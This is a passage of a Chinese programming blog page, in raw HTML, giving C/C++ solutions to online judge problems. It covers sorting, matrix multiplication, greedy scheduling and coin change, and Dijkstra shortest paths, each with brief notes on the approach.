class="line"><span class="keyword">char</span> s[<span class="number">2005</span>];</div><div class="line"><span class="keyword">char</span> t[<span class="number">2005</span>];</div><div class="line"><span class="keyword">int</span> sp,ep;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s[i] &gt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] &lt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == s[j])&#123;</div><div class="line">        i++;</div><div class="line">        j--;</div><div class="line">        <span class="keyword">return</span> compare(i,j);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">" %c"</span>,&amp;s[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sp = <span class="number">0</span>;</div><div class="line">    ep = n<span class="number">-1</span>;</div><div class="line">    <span class="keyword">int</span> lenoft = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (lenoft != n)&#123;</div><div class="line">        <span class="keyword">int</span> p = compare(sp,ep);</div><div class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>)&#123;</div><div class="line">            t[lenoft] = s[sp];</div><div class="line">            sp++;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p == <span class="number">1</span>)&#123;</div><div class="line">            t[lenoft] = s[ep];</div><div class="line">            ep--;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,t[i<span class="number">-1</span>]);</div><div class="line">        <span class="keyword">if</span> (i % <span class="number">80</span> == <span class="number">0</span>)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="XOJ"><a href="#XOJ" class="headerlink" title="XOJ"></a>XOJ</h1><h2 id="1004"><a href="#1004" class="headerlink" title="1004"></a>1004</h2><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：）</p>
<h3 id="提交-12"><a href="#提交-12" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> arrays[<span class="number">1000004</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arrays[i]);</div><div class="line">    sort(arrays,arrays+n);</div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n - <span class="number">1</span>;j++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,arrays[j]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arrays[n - <span class="number">1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>oj对格式要求好严格…</p>
<h2 id="1005"><a href="#1005" class="headerlink" title="1005"></a>1005</h2><p>此题另写一篇文章了。</p>
<h2 id="1022"><a href="#1022" class="headerlink" title="1022"></a>1022</h2><h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>直接用普通的矩阵乘法就过了，<br>时间复杂度 O(<script type="math/tex">n^3</script>)</p>
<h3 id="提交-13"><a href="#提交-13" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n1,m1;</div><div class="line">    <span class="keyword">int</span> n2,m2;</div><div class="line">    <span class="keyword">int</span> matrix1[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">int</span> matrix2[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n1,&amp;m1);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m1;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix1[i][j]);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n2,&amp;m2);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n2;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix2[i][j]);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> matrix3[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            matrix3[i][j]=<span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i1,j2;</div><div class="line">    <span class="keyword">for</span>(i1 = <span class="number">0</span>;i1 &lt; n1;i1++)</div><div class="line">        <span class="keyword">for</span>(j2 = <span class="number">0</span>;j2 &lt; m2;j2++)</div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n2;j++)</div><div class="line">              matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2 - <span class="number">1</span>;j++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,matrix3[i][j]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,matrix3[i][m2<span class="number">-1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1061"><a href="#1061" class="headerlink" title="1061"></a>1061</h2><h3 id="想法-2"><a href="#想法-2" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。其实就是任务选择问题。</p>
<ul>
<li>按照约会完成时间从早到晚排序</li>
<li>选择具有最早完成时间的girl</li>
<li>将此girl加入到约会列表中</li>
<li>对子问题重复上述问题</li>
<li>强烈谴责Ckp</li>
</ul>
<h3 id="提交-14"><a href="#提交-14" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> info&#123;</div><div class="line">    <span class="keyword">char</span>  name[<span class="number">16</span>];</div><div class="line">    <span class="keyword">char</span>  starttime[<span class="number">6</span>];</div><div class="line">    <span class="keyword">char</span>  endtime[<span class="number">6</span>];</div><div class="line">&#125;info;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info * s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">static</span> info mm[<span class="number">1005</span>] ;</div><div class="line">    <span class="keyword">static</span> info mmcopy[<span class="number">1005</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s%s"</span>,mm[i].name,mm[i].starttime,mm[i].endtime);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(mm,<span class="number">1</span>,n,n);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].endtime,mm[<span class="number">1</span>].endtime);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].name,mm[<span class="number">1</span>].name);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].starttime,mm[<span class="number">1</span>].starttime);</div><div class="line">    <span class="keyword">int</span> cal = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mmcopy[cal].endtime,mm[i].starttime) &lt;= <span class="number">0</span>)&#123;</div><div class="line">            cal++;</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].endtime,mm[i].endtime);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].name,mm[i].name);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].starttime,mm[i].starttime);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cal);</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; cal; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,mmcopy[i].name);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,mmcopy[i].name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info* s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)&#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        info x;</div><div class="line">        <span class="built_in">strcpy</span>(x.endtime,s[l].endtime);</div><div class="line">        <span class="built_in">strcpy</span>(x.name,s[l].name);</div><div class="line">        <span class="built_in">strcpy</span>(x.starttime,s[l].starttime);</div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[j].endtime,x.endtime) &gt;= <span class="number">0</span>)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                <span class="built_in">strcpy</span>(s[i].endtime,s[j].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].starttime,s[j].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].name , s[j].name);</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[i].endtime,x.endtime) &lt; <span class="number">0</span>)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line"></div><div class="line">                <span class="built_in">strcpy</span>(s[j].endtime,s[i].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].starttime,s[i].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].name,s[i].name);</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(s[i].endtime,x.endtime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].starttime,x.starttime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].name,x.name);</div><div class="line"></div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>,n);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r,n);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1062"><a href="#1062" class="headerlink" title="1062"></a>1062</h2><h3 id="想法-3"><a href="#想法-3" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。尽量选择面值大的。<br>将元转换为角，这样都是整数，进行处理更方便。</p>
<h3 id="提交-15"><a href="#提交-15" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> zhibi&#123;</div><div class="line">    <span class="keyword">int</span> number;</div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">&#125;zhibi;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    zhibi arr[<span class="number">7</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i].number);</div><div class="line">    &#125;</div><div class="line">    arr[<span class="number">1</span>].value = <span class="number">500</span>;</div><div class="line">    arr[<span class="number">2</span>].value = <span class="number">100</span>;</div><div class="line">    arr[<span class="number">3</span>].value = <span class="number">50</span>;</div><div class="line">    arr[<span class="number">4</span>].value = <span class="number">10</span>;</div><div class="line">    arr[<span class="number">5</span>].value = <span class="number">5</span>;</div><div class="line">    arr[<span class="number">6</span>].value = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> remainMoney;</div><div class="line">    remainMoney = <span class="number">1000</span> - n * <span class="number">25</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">int</span> j = remainMoney / arr[i].value;</div><div class="line">            <span class="keyword">int</span> number = j&gt;arr[i].number?arr[i].number:j;</div><div class="line">            remainMoney = remainMoney - number*arr[i].value;</div><div class="line">            stat = stat + number;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,stat);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1075"><a href="#1075" class="headerlink" title="1075"></a>1075</h2><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><p>直接dijkstra。 采用邻接矩阵存储。</p>
<h3 id="提交-16"><a href="#提交-16" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1078"><a href="#1078" class="headerlink" title="1078"></a>1078</h2><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><p>任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。</p>
<h3 id="提交-17"><a href="#提交-17" class="headerlink" title="提交"></a>提交</h3><h4 id="dijkstra算法"><a href="#dijkstra算法" class="headerlink" title="dijkstra算法"></a>dijkstra算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span 